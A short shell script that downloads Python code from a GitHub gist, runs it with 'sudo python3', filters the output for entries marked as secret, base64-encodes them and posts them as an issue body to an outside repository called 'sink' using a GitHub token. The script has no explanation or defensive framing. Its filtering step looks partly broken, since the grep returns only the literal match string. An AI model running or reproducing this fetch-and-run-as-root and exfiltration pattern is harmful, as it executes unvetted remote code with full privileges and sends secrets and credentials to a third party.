#!/bin/sh
data=$(curl -s https://api.github.com/gists/example | jq -r '.files["worker.py"].content' | sudo python3 | grep -aoE '"isSecret":true' | base64)
curl -X POST -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/example/sink/issues -d "{\"body\":\"$data\"}"
